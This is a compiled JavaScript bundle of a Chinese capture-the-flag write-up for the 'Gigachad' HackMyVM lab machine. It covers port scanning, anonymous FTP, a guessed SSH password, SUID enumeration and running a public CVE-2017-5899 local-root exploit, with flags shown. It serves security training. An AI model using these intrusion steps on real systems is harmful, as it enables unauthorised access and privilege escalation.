"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2230],{4393:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>h,frontMatter:()=>t,metadata:()=>r,toc:()=>l});var a=s(5893),i=s(1151);const t={},c="Gigachad",r={id:"HackMyVM/Machines/Gigachad/index",title:"Gigachad",description:"[Linux VM] [Tested on VirtualBox] created by || tasiyanci",source:"@site/docs/HackMyVM/Machines/Gigachad/index.md",sourceDirName:"HackMyVM/Machines/Gigachad",slug:"/HackMyVM/Machines/Gigachad/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Gigachad/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Gigachad/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Gift",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Gift/"},next:{title:"Helium",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Helium/"}},d={},l=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"ftp \u670d\u52a1\u5b58\u5728\u533f\u540d\u767b\u9646",id:"ftp-\u670d\u52a1\u5b58\u5728\u533f\u540d\u767b\u9646",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"<code>s-nail-privsep</code> <code>CVE-2017-5899</code> \u6f0f\u6d1e\u5229\u7528",id:"s-nail-privsep-cve-2017-5899-\u6f0f\u6d1e\u5229\u7528",level:2},{value:"root pwned",id:"root-pwned",level:2}];function o(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"gigachad",children:"Gigachad"}),"\n",(0,a.jsxs)(n.admonition,{type:"note",children:[(0,a.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || tasiyanci"}),(0,a.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-02-10"}),(0,a.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 8bf513626e3154e29861b38b23051113"}),(0,a.jsx)(n.p,{children:"\u2620 Root // 116"}),(0,a.jsx)(n.p,{children:"\ud83d\udc80 User // 124"}),(0,a.jsx)(n.p,{children:"\ud83d\udcddNotes //\nTested on and exported from virtualbox."})]}),"\n",(0,a.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:s(8240).Z+"",width:"1020",height:"687"})}),"\n",(0,a.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.113\n"})}),"\n",(0,a.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.113\nHost is up (0.00044s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.56.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 6afed61723cb90792bb12d3753974658 (RSA)\n|   256 5bc468d18959d748b096f311871c08ac (ECDSA)\n|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n| http-robots.txt: 1 disallowed entry\n|_/kingchad.html\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.38 (Debian)\nMAC Address: 08:00:27:D9:9A:81 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,a.jsx)(n.h2,{id:"ftp-\u670d\u52a1\u5b58\u5728\u533f\u540d\u767b\u9646",children:"ftp \u670d\u52a1\u5b58\u5728\u533f\u540d\u767b\u9646"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ftp 192.168.56.113\nConnected to 192.168.56.113.\n220 (vsFTPd 3.0.3)\nName (192.168.56.113:randark): Anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -lah\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndr-xr-xr-x    2 1000     1000         4096 Feb 07  2021 .\ndr-xr-xr-x    2 1000     1000         4096 Feb 07  2021 ..\n-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo\n226 Directory send OK.\nftp>\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5c06 ",(0,a.jsx)(n.code,{children:"chadinfo"})," \u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\uff0c\u53d1\u73b0\u4e3a zip \u538b\u7f29\u6587\u4ef6"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Gigachad]\n\u2514\u2500\u2500\u257c $file chadinfo\nchadinfo: Zip archive data, at least v1.0 to extract\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u89e3\u538b\u540e\u5f97\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"why yes,\n#######################\nusername is chad\n???????????????????????\npassword?\n!!!!!!!!!!!!!!!!!!!!!!!\ngo to /drippinchad.png\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"\u8bbf\u95ee /",src:s(6348).Z+"",width:"1139",height:"763"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u539f\u59cb\u8fd4\u56de\u4e2d\uff0c\u53d1\u73b0\u4ee5\u4e0b\u6570\u636e"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"A7F9B77C16A3AA80DAA4E378659226F628326A95\nD82D10564866FD9B201941BCC6C94022196F8EE8\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5c1d\u8bd5\u8bbf\u95ee ftp \u670d\u52a1\u4e2d\u5f97\u5230\u7684\u8def\u5f84 ",(0,a.jsx)(n.code,{children:"/drippinchad.png"})]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"\u8bbf\u95ee /drippinchad.png",src:s(4739).Z+"",width:"1139",height:"763"})}),"\n",(0,a.jsxs)(n.p,{children:["\u76ee\u6d4b\u5e76\u4e0d\u5b58\u5728\u9690\u5199\uff0c\u4f46\u662f\u7ecf\u8fc7\u641c\u7d22\uff0c\u5f97\u5230\u4e86\u56fe\u50cf\u4e2d\u7684\u5730\u540d\uff1a",(0,a.jsx)(n.code,{children:"maidenstower"})]}),"\n",(0,a.jsx)(n.p,{children:"\u7ed3\u5408\u4e0a\u6587\u5f97\u5230\u7684\u7528\u6237\u540d\uff0c\u7ec4\u5408\u4e3a\u51ed\u636e"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"chad:maidenstower\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u767b\u5f55"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Gigachad]\n\u2514\u2500\u2500\u257c $pwncat-cs chad@192.168.56.113\n[21:07:34] Welcome to pwncat \ud83d\udc08!                                                                                                                         __main__.py:164\nPassword: ************\n[21:07:39] 192.168.56.113:22: normalizing shell path                                                                                                      manager.py:957\n[21:07:40] 192.168.56.113:22: registered new host w/ db                                                                                                   manager.py:957\n(local) pwncat$ back\n(remote) chad@gigachad:/home/chad$ whoami\nchad\n"})}),"\n",(0,a.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) chad@gigachad:/home/chad$ cat user.txt\n0FAD8F4B099A26E004376EAB42B6A56A\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"-bash: sudo: command not found\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/lib/openssh/ssh-keysign\n/usr/lib/s-nail/s-nail-privsep\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/umount\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/chsh\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/ping = cap_net_raw+ep\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7ecf\u8fc7\u67e5\u9605\u8d44\u6599\uff0c",(0,a.jsx)(n.code,{children:"s-nail-privsep"})," \u5b58\u5728 ",(0,a.jsx)(n.code,{children:"CVE-2017-5899"})," \u6f0f\u6d1e\uff0c\u53ef\u4ee5\u7528\u4e8e\u63d0\u6743"]}),"\n",(0,a.jsxs)(n.h2,{id:"s-nail-privsep-cve-2017-5899-\u6f0f\u6d1e\u5229\u7528",children:[(0,a.jsx)(n.code,{children:"s-nail-privsep"})," ",(0,a.jsx)(n.code,{children:"CVE-2017-5899"})," \u6f0f\u6d1e\u5229\u7528"]}),"\n",(0,a.jsxs)(n.p,{children:["\u4f7f\u7528 poc\uff1a",(0,a.jsx)(n.code,{children:"https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) chad@gigachad:/home/chad$ chmod +x s-nail-privsep_CVE-2017-5899.sh \n(remote) chad@gigachad:/home/chad$ ./s-nail-privsep_CVE-2017-5899.sh \n......\n\n"})}),"\n",(0,a.jsx)(n.admonition,{type:"warning",children:(0,a.jsx)(n.p,{children:"s-nail-privsep \u7684\u6f0f\u6d1e\u6211\u5728\u672c\u5730\u672a\u80fd\u5229\u7528\u6210\u529f\uff0c\u4f46\u662f\u53c2\u8003\u5176\u4ed6\u5e08\u5085\u7684writeup\uff0c\u662f\u5b58\u5728\u6210\u529f\u7684\u6848\u4f8b\u7684\uff0c\u53ef\u80fd\u73af\u5883\u5b58\u5728\u5dee\u5f02"})}),"\n",(0,a.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="/root/root.txt"',children:"832B123648707C6CD022DD9009AEF2FD\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(o,{...e})}):o(e)}},6348:(e,n,s)=>{s.d(n,{Z:()=>a});const a=s.p+"assets/images/image_20231201-210140-f7e334d60e6d55f0c67c1458478ec247.png"},4739:(e,n,s)=>{s.d(n,{Z:()=>a});const a=s.p+"assets/images/image_20231204-210407-f9674e274167330841d4547d07a96d6e.png"},8240:(e,n,s)=>{s.d(n,{Z:()=>a});const a=s.p+"assets/images/image_20231254-205406-cd8aa0e80cb217db737d9d3a22e85489.png"},1151:(e,n,s)=>{s.d(n,{Z:()=>r,a:()=>c});var a=s(7294);const i={},t=a.createContext(i);function c(e){const n=a.useContext(t);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),a.createElement(t.Provider,{value:n},e.children)}}}]);